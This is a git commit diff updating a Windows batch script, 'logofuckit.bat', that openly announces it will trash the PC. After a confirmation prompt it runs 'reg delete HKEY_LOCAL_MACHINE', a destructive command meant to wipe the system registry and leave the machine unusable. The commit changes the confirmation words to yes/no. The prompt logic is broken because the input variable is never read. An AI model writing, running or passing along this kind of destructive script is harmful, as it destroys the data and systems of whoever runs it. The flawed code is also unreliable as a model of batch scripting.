5017506349052e265fc7ac42e5c7263be2ecb2ec
1here3 <159972256+1here3@users.noreply.github.com>
2024-06-04 14:07:26 -0700

    Update logofuckit.bat

--- logofuckit.bat
+++ logofuckit.bat
@@ -1,12 +1,13 @@
-@echo off
-
+ @echo off
 :1
+color a
 echo logofuckit.bat has a lot of cavity to trash your PC, are you sure you want to run it, RESULTING IN A UNUSABLE MACINE?
-if /i %input%==Ygr goto yes
-if /i %input%==wininit goto no
-if /i not %input%== Ygr,wininit goto 1
+if /i %input%==Yes goto yes
+if /i %input%==no goto no
+if /i not %input%== yes,no goto 1
 :yes
 reg delete HKEY_LOCAL_MACHINE
+exit
 :no
 echo WTF-
 timeout 1
